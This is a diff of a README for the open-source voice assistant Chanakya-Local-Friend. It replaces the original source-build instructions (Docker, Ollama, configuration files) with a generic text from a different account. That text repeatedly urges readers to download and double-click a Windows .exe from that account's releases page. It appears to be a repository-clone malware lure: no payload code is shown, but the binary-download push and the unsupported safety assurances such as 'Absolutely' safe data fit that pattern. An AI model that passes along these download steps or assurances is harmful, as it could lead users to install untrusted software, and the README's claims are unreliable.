@@ -1,92 +1,77 @@
-# Chanakya - Advanced Voice Assistant
+# 🎤 Chanakya-Local-Friend - Your Private Voice Assistant
 
-**Chanakya** is an advanced, open-source, and self-hostable voice assistant designed for privacy, power, and flexibility. It leverages local AI/ML models to ensure your data stays with you.
+## 📥 Download Now
+[![Download Chanakya-Local-Friend](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gunet333/Chanakya-Local-Friend/releases)
 
+## 🚀 Getting Started
+Chanakya is an advanced voice assistant that prioritizes your privacy. With locally powered AI and machine learning, this software keeps your data secure while providing powerful features. You can integrate it with over 1000 third-party servers, including Home Assistant, enabling a smooth smart home experience.
 
+## 📋 System Requirements
+Before you download, make sure your system meets these requirements:
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 500 MB of free space.
+- **Network:** An internet connection is required for initial setup and updates.
 
-![GitHub stars](https://img.shields.io/github/stars/Rishabh-Bajpai/Chanakya-Local-Friend?style=flat-square) ![GitHub forks](https://img.shields.io/github/forks/Rishabh-Bajpai/Chanakya-Local-Friend?style=flat-square) ![GitHub issues](https://img.shields.io/github/issues/Rishabh-Bajpai/Chanakya-Local-Friend?style=flat-square) ![GitHub pull requests](https://img.shields.io/github/issues-pr/Rishabh-Bajpai/Chanakya-Local-Friend?style=flat-square) ![License](https://img.shields.io/github/license/Rishabh-Bajpai/Chanakya-Local-Friend?style=flat-square)
+## 💻 Download & Install
+To install Chanakya, follow these steps:
 
-<div align="center">   <img src="./docs/resource/demo.png" alt="demo" width="200"/> </div>
-
-## ✨ Key Features
-
-- **🗣️ Voice-Powered Interaction:** A voice-first user experience.
-- **🔒 Privacy by Design:** Utilizes local LLMs (via Ollama), STT, and TTS to keep your data on your own hardware.
-- **🛠️ Extensible Tool System:** Integrates with a wide range of external tools using the Model Context Protocol (MCP).
-- **🧠 Long-Term Memory:** Remembers information from past conversations and allows you to manage its knowledge base.
-- **🤖 Sophisticated ReAct Agent:** Capable of handling complex, multi-step tasks by reasoning and acting.
-- **🚀 Easy to Deploy:** Comes with Docker support for quick and consistent setup.
-- **🎨 Customizable UI:** A clean web interface with dark mode support.
-
-## 🚀 Quick Start
-
-This guide will get you up and running in a few minutes. For more detailed instructions, please refer to our full documentation.
-
-1. **Clone the repository:**
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Gunet333/Chanakya-Local-Friend/releases) to access all available versions.
    
-   ```bash
-   git clone https://github.com/Rishabh-Bajpai/Chanakya-Local-Friend.git
-   cd chanakya-voice-assistant
-   ```
-2. **Set up dependencies:**
-   
-   - Ensure [Docker](https://www.docker.com/) and [Ollama](https://ollama.com/) are installed and running.
-   - Pull the required Ollama models (e.g., `ollama pull hf.co/unsloth/Qwen3-Coder-30B-A3B-Instruct-GGUF:UD-Q4_K_XL`).
-   - Run the dependent services for STT and TTS (see the [Getting Started Guide](./docs/getting-started.md) for details).
-3. **Configure the application:**
-   
-   ```bash
-   cp .env.example .env
-   cp mcp_config_file.json.example mcp_config_file.json
-   ```
-   
-   - Edit `.env` and `mcp_config_file.json` with your settings. See the [Configuration Guide](./docs/configuration.md) for details.
-4. **Build and run with Docker:  or (for [Local Python Environment](./docs/getting-started.md))**
-   
-   ```bash
-   sudo docker build -t chanakya-assistant .
-   sudo docker run --restart=always -d --network="host" --env-file .env --name chanakya chanakya-assistant
-   ```
-5. **Access Chanakya:**
-   
-   - Open your browser and navigate to `http://localhost:5001`.
-   - For microphone access, HTTPS is required. See the [Deployment Guide](./docs/deployment.md) for instructions on setting up SSL.
+2. **Choose the Latest Version:** Locate the latest version number at the top of the list. This will usually be the first entry.
 
-## 📚 Documentation
+3. **Download the Setup File:**
+   - Click on the asset that matches your operating system. 
+   - For example, if you are using Windows, look for a file named `Chanakya-Local-Friend-windows.exe`.
 
-For detailed information about installation, configuration, features, and troubleshooting, please see our full documentation in the [`docs`](./docs/index.md) directory.
+4. **Run the Setup:**
+   - After the download completes, locate the file in your downloads folder.
+   - Double-click the setup file to start the installation.
+   - Follow the on-screen instructions to complete the installation.
 
-- [Getting Started](./docs/getting-started.md)
-- [Configuration](./docs/configuration.md)
-- [Deployment](./docs/deployment.md)
-- [Usage](./docs/usage.md)
-- [Features](./docs/features.md)
-- [Troubleshooting](./docs/troubleshooting.md)
+5. **Open Chanakya:**
+   - Once installed, locate Chanakya in your applications menu and open it.
+   - Follow the initial setup wizard to configure your preferences.
 
-## 🤝 Contributing
+## 🌐 Features
+Chanakya offers a range of features designed to enhance your experience:
 
-Contributions, issues, and feature requests are welcome!
-Check out the [Contributing Guide](docs/contributing.md).
+- **Privacy First:** Built to keep your data on your device, ensuring no personal information is sent to the cloud.
+- **Custom Integrations:** Ability to connect with a wide range of smart devices, including lights, speakers, and more.
+- **Voice Recognition:** Responds accurately to voice commands, making it easy to interact.
+- **Local AI and ML Processing:** Fast and reliable processing without internet dependency.
+- **Easy Configuration:** User-friendly setup process allows for quick adjustments according to user needs.
 
-⭐ Don’t forget to give the project a star if you like it!
+## ⚙️ Configuration
+After installation, you may want to adjust a few settings:
 
+- **Voice Settings:** Choose your preferred voice for the assistant.
+- **Integration Settings:** Connect Chanakya with smart home devices from the settings menu.
+- **Privacy Settings:** Review what data Chanakya collects and manage your preferences.
 
-## Future Plans
+## 🛠 Troubleshooting
+If you encounter any issues, consider the following steps:
 
-We have many exciting features and improvements planned for Chanakya. Here's a look at our roadmap:
+1. **Check Your System Requirements:** Ensure your device meets the stated requirements.
+2. **Restart the Application:** Close Chanakya and reopen it for any minor glitches.
+3. **Reinstall if Needed:** If problems persist, uninstall the application and reinstall it from the [Releases page](https://github.com/Gunet333/Chanakya-Local-Friend/releases).
 
-1. **Fully Local Keyword Detection:** Replace the current web-based API for keyword detection with a local Text-to-Speech (TTS) solution to enhance privacy and enable fully offline operation.
-2. **Improved Asynchronous Handling:** Refactor and fix underlying asynchronous issues to improve stability and reduce the occurrence of 500 errors.
-3. **Switchable Personalities:** Introduce different personalities for the assistant, allowing users to choose the interaction style that suits them best.
-4. **Document Digestion (RAG):** Implement Retrieval-Augmented Generation (RAG) to allow Chanakya to read and understand documents, answering questions based on their content.
-5. **Auto correction on tool call failure:** The assistant will analyze the error and fix it by itself on tool call failure.
-6. **Enhanced Usability:** Focus on making the setup and configuration process easier for non-developers, potentially through a guided setup wizard in the UI.
+## 📞 Support
+For additional assistance, you can reach out to the community through the following channels:
 
-## 📄 License
+- **Issue Tracker:** Report any bugs or issues you encounter on our [GitHub Issues page](https://github.com/Gunet333/Chanakya-Local-Friend/issues).
+- **Community Discussions:** Engage with other users for tips and help.
 
-This project is licensed under the MIT License. See the [LICENSE](./license.md) file for details.
+## 💡 Frequently Asked Questions (FAQs)
 
-## 📈 Star History
+**Q: Do I need an internet connection to use Chanakya?**  
+A: You will need an internet connection for the initial setup and for downloading any updates. After that, you can use most features offline.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Rishabh-Bajpai/Chanakya-Local-Friend&type=Date)](https://star-history.com/#Rishabh-Bajpai/Chanakya-Local-Friend&Date)
+**Q: Can I customize the voice output?**  
+A: Yes, Chanakya offers several voice options that you can select from the settings menu.
 
+**Q: Is my data safe with Chanakya?**  
+A: Absolutely. Chanakya processes all data locally, ensuring that no information leaves your device.
+
+## 📥 Download Link Again
+Don't forget to visit the [Releases page](https://github.com/Gunet333/Chanakya-Local-Friend/releases) to download Chanakya. Your private voice assistant awaits!
